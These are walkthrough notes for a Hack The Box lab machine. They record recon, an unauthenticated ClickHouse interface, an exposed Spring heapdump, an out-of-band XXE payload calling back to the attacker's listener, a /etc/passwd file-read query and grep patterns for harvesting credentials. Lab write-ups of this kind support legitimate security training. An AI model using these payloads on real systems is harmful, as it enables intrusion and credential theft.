# HTB — Stream — Walkthrough Notes

> **Target:** `10.129.78.124`
> **Hostnames discovered:** `htb-airport.htb`, `api.htb-airport.htb`, `db.htb-airport.htb`
> **Attacker/VPN (tun0) IP:** `10.10.15.100`
> Authorized HTB lab, educational use only.
>
> **How to read this file:** every section gives *what was tried* → *exact command* → *actual output*, in order, so you can reproduce the box. Dead ends are kept (marked ✗) on purpose — knowing what did **not** work is half the learning. Confirmed facts are marked ✓; blocked/incomplete steps are marked ⚠.

---

## ⚠ IMPORTANT — current instance state (read first)

During enumeration the exposed **Spring Boot `/actuator/heapdump`** (a ~125 MB JVM dump) was requested many times. **Each GET makes the server generate a full heap dump, and that generation keeps running server-side even after the client disconnects.** On this small/low-RAM instance that piled up, the JVM went into swap-thrash, and by the end **every "real work" request hangs** (the heapdump never returns a byte; ClickHouse `SELECT` queries hang), while only trivial cached endpoints (`/status`, `/ping`) still answer in ~0.4 s.

**→ Reset the machine from the HTB panel before continuing**, then follow §6 "Post-reset plan" and treat the heapdump endpoint gently (one request, wait, do not loop it).

The recon below is fully valid and was all captured *before/around* the box degrading. The two foothold candidates (ClickHouse unauth SQL, and the Spring heapdump) are both confirmed to exist; completing either just needs a healthy instance.

---

## 0. Setup

Add the virtual hosts (needs sudo — run in your shell):

```bash
echo "10.129.78.124 htb-airport.htb api.htb-airport.htb db.htb-airport.htb" | sudo tee -a /etc/hosts
```

> The generic cheatsheet in the original `readme.md` guessed a *media/"Stream"* theme (ffmpeg/HLS). The real box is an **airport flight-data pipeline**: an nginx front end proxying a **Spring Boot gateway**, a **FastAPI AIDX XML ingest**, and a **ClickHouse** database. The *method* (recon → find the leaky service → loot creds → privesc) is unchanged; the specifics differ.

---

## 1. Initial Recon

### 1.1 Full TCP port sweep ✓
```bash
nmap -p- --min-rate 5000 -T4 -oA scans/stream-all 10.129.78.124
```
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8081/tcp  open  blackice-icecap   # actually HTTP (Uvicorn)
37685/tcp open  unknown           # tcpwrapped
```

### 1.2 Service / version scan ✓
```bash
nmap -sC -sV -p 22,80,8081,37685 -oA scans/stream-svc 10.129.78.124
```
| Port  | Service | Detail |
|-------|---------|--------|
| 22    | OpenSSH 9.6p1 | Ubuntu 3ubuntu13.19 |
| 80    | nginx 1.24.0 (Ubuntu) | `/` → 301 → `http://api.htb-airport.htb/` |
| 8081  | **Uvicorn** (Python/FastAPI) | JSON |
| 37685 | tcpwrapped | accepts TCP then stays silent; not HTTP, not TLS (`nc`, raw HTTP/1.1, and `openssl s_client` all get nothing). Treated as noise/ephemeral. |

Key takeaway: the 301 on port 80 leaks the real domain **`htb-airport.htb`**.

---

## 2. Web Enumeration

### 2.1 Virtual-host discovery ✓  ← the important pivot
```bash
ffuf -u http://10.129.78.124/ -H "Host: FUZZ.htb-airport.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc all -fs 178,362 -t 50
```
Result:
```
db          <-- db.htb-airport.htb
```
(`api` is the default; `db` is the new surface — see §2.4.)

### 2.2 Port 80 — `api.htb-airport.htb` (Spring Boot "terminal-edge-gateway") ✓
```bash
curl -s -H "Host: api.htb-airport.htb" http://10.129.78.124/
```
```json
{"service":"terminal-edge-gateway","status":"operational","version":"1.0.0",
 "node":"tg-edge-01","region":"eu-central-1",
 "upstreams":{"flight-data-service":"UP","boarding-control":"UP",
              "gate-assignment":"UP","passenger-manifest":"UP"}}
```
Directory brute force:
```bash
feroxbuster -u http://10.129.78.124/ -H "Host: api.htb-airport.htb" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 --no-recursion
```
Non-404 hits:
```
200  /            status JSON
200  /status      same JSON
200  /health      {"status":"Up"}
500  /error       Spring-style error JSON  -> confirms a Java / Spring Boot app
200  /actuator    *** Spring Boot Actuator *** (see §3)
```
`OPTIONS /` → `Allow: GET,HEAD,OPTIONS`. No write/flight/validate routes exist (all 404).

### 2.3 Port 8081 — FastAPI "AIDX flight-leg ingest" ✓
```bash
curl -s http://10.129.78.124:8081/
curl -s http://10.129.78.124:8081/openapi.json
curl -s http://10.129.78.124:8081/health
```
```json
{"service":"AIDX flight-leg ingest","what":"Accepts AIDX XML for processing",
 "how":{"method":"POST","path":"/feeds/aidx","content_type":"application/xml","max_bytes":262144},
 "required_elements":["IATA_AIDX_FlightLegNotifRQ","Originator","FlightLeg","LegIdentifier"],
 "note":"Ingest does not parse. Full validation happens downstream."}
# openapi: only 3 routes -> GET /, GET /health, POST /feeds/aidx
# health: {"status":"ok","service":"AIDX flight-leg ingest","raw_topic":"aidx.flightleg.raw.v1"}
```
So this service only **validates that the body looks like XML and republishes the raw bytes to a message topic** (`aidx.flightleg.raw.v1`); a separate "downstream" service does the real parsing.

Baseline:
```bash
curl -s -X POST http://10.129.78.124:8081/feeds/aidx -H "Content-Type: application/xml" --data-binary @aidx.xml
# valid-looking XML -> {"accepted":true,"topic":"aidx.flightleg.raw.v1"}
# non-XML          -> {"accepted":false,"reason":"not_xml"}
```

### 2.4 Port 80 — `db.htb-airport.htb` → **ClickHouse** ✓  ← primary foothold candidate
```bash
curl -s -i -H "Host: db.htb-airport.htb" http://10.129.78.124/
```
```
HTTP/1.1 200 OK
X-ClickHouse-Summary: {"read_rows":"0",...}
X-ClickHouse-Exception-Tag: ...
Ok.
```
The `X-ClickHouse-*` headers confirm an exposed **ClickHouse HTTP interface** proxied through nginx. `GET /` and `GET /ping` both return `Ok.` **with no authentication** — a ClickHouse HTTP interface reachable unauthenticated is the designed way in.

How you query ClickHouse over HTTP (for when the box is healthy):
```bash
# query in the POST body:
curl -s -H "Host: db.htb-airport.htb" http://10.129.78.124/ --data-binary "SELECT version()"
# or as a URL param:
curl -s -G -H "Host: db.htb-airport.htb" http://10.129.78.124/ --data-urlencode "query=SHOW DATABASES"
```

---

## 3. Spring Boot Actuator — `/actuator/heapdump` ✓ (exposed) / ⚠ (download blocked)

```bash
curl -s -H "Host: api.htb-airport.htb" http://10.129.78.124/actuator
# -> {"_links":{"self":{...},"heapdump":{"href":".../actuator/heapdump"}}}
```
Only **`heapdump`** is exposed (`env`, `beans`, `configprops`, `mappings`, `info`, `health`, … all 404). A JVM heap dump is a full memory snapshot and routinely contains **plaintext DB/service credentials, tokens and env vars** — the classic "leaky actuator → creds" foothold.

`HEAD` reveals the size:
```bash
curl -sI -H "Host: api.htb-airport.htb" http://10.129.78.124/actuator/heapdump
# Content-Length: 131683503   (~125 MB)   Accept-Ranges: bytes
```

⚠ **Download could not be completed on this instance.** Every `GET` (plain, gzip, and byte-range) returns **no bytes and no status line**, then the connection is reset at a hard **~184 s** regardless of client timeout:
```
code=000 size=0 firstbyte=0.000000s total=184.2s
```
Why: the server generates the whole 125 MB dump before nginx forwards anything; on this low-RAM box that exceeds the upstream's ~180 s request timeout (and each attempt leaves a server-side dump running → see the ⚠ banner at top). `Accept-Ranges: bytes` is advertised but ranged requests behave the same (nginx buffers the full upstream response). On a freshly reset box, a single patient request has a far better chance (§6).

---

## 4. Attempted and did NOT work (kept on purpose)

- ✗ **OOB XXE via the AIDX feed.** Sent both a general-entity and a parameter-entity / external-DTD payload pointing at a local `python3 -m http.server` on `10.10.15.100:8000`:
  ```xml
  <!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://10.10.15.100:8000/hit"> ]>
  <IATA_AIDX_FlightLegNotifRQ><Originator>&xxe;</Originator>
    <FlightLeg><LegIdentifier>x</LegIdentifier></FlightLeg></IATA_AIDX_FlightLegNotifRQ>
  ```
  Ingest returns `{"accepted":true}` but **the listener never received a callback** over several minutes. Likely one of: no downstream consumer running on this instance, the downstream parser has external entities disabled, or egress is filtered. Revisit after a reset / after the heapdump or ClickHouse path yields more context. (XXE against the downstream AIDX validator remains the most plausible *second* path — the service description practically advertises it.)
- ✗ **Direct access to the Spring app on `37685`** (to bypass nginx buffering for the heapdump) — port is tcpwrapped, not HTTP/TLS.
- ✗ **Reaching the "downstream" validator directly** — no extra routes on 80 or 8081 (`/feeds`, `/validate`, `/flightleg`, `/ingest`, `/gateway/routes`, … all 404).

---

## 5. What the box is (model)

```
                         ┌───────────────────────────── nginx :80 (vhost routing)
 attacker ── :80 ────────┤  api.htb-airport.htb  → Spring Boot gateway (actuator/heapdump exposed)
            :8081 ───────┤  db.htb-airport.htb   → ClickHouse HTTP (unauthenticated)
                         └  (default)            → 301 to api
            :8081  FastAPI "AIDX ingest"  → publishes raw XML to topic aidx.flightleg.raw.v1 → downstream validator (parses → XXE?)
            :22    OpenSSH 9.6p1
```
Two credible footholds, both confirmed to exist:
1. **ClickHouse unauth SQL** (`db.htb-airport.htb`) — enumerate databases/tables for flight-data + stored credentials; ClickHouse can also read server-side files via the `file()` table function / `SELECT ... FROM file(...)`, a known local-file-read primitive.
2. **Spring heapdump** (`api…/actuator/heapdump`) — download, then mine with strings/JDumpSpider for `spring.datasource`/service creds.

Either is expected to yield credentials that are then **reused on SSH (22)** for the user shell, followed by local privesc (see the CVE table / playbook in the original `readme.md`: `sudo -l`, SUID, caps, cron, then version-matched kernel/polkit/sudo CVEs).

---

## 6. Post-reset plan (do these in order, gently)

1. **Reset the machine** in the HTB panel; wait ~2 min for services to come up (`curl -s -H 'Host: db.htb-airport.htb' http://10.129.78.124/ping` → `Ok.`).
2. **ClickHouse first** (cheap, no side effects). One query at a time:
   ```bash
   CH(){ curl -s -H "Host: db.htb-airport.htb" http://10.129.78.124/ --data-binary "$1"; }
   CH "SELECT version()"
   CH "SHOW DATABASES"
   CH "SELECT database,name FROM system.tables WHERE database NOT IN ('system','information_schema','INFORMATION_SCHEMA') FORMAT TSV"
   # then dump interesting tables, e.g. anything with users/creds/passengers:
   CH "SELECT * FROM <db>.<table> LIMIT 50 FORMAT TSV"
   # ClickHouse local file read primitive (try after enumerating):
   CH "SELECT * FROM file('/etc/passwd','LineAsString') FORMAT TSV"
   ```
3. **Heapdump** (only if ClickHouse doesn't give creds) — a *single* request, be patient, do **not** loop:
   ```bash
   curl -s -H "Host: api.htb-airport.htb" --max-time 300 -o heapdump.bin \
        http://10.129.78.124/actuator/heapdump
   # then:
   strings -n 8 heapdump.bin | grep -iE 'password|passwd|secret|token|datasource|jdbc|ssh|user=' | sort -u
   # or use JDumpSpider / python: https://github.com/whwlsfb/JDumpSpider
   ```
4. **Found creds →** `ssh <user>@10.129.78.124`, grab `user.txt`.
5. **Privesc:** `id; sudo -l; uname -a; cat /etc/os-release`, then `find / -perm -4000 2>/dev/null`, `getcap -r / 2>/dev/null`, cron/`pspy`, and only then a version-matched CVE from the original cheatsheet table. `linpeas.sh | tee linpeas.out`.
6. **(Optional) XXE path:** restart a listener (`python3 -m http.server 8000 --bind 10.10.15.100`) and resend the AIDX OOB payload now that a downstream consumer is freshly running; watch for the callback.

---

## Appendix — scan artifacts
- `scans/stream-all.*` — full TCP sweep
- `scans/stream-svc.*` — service/version scan
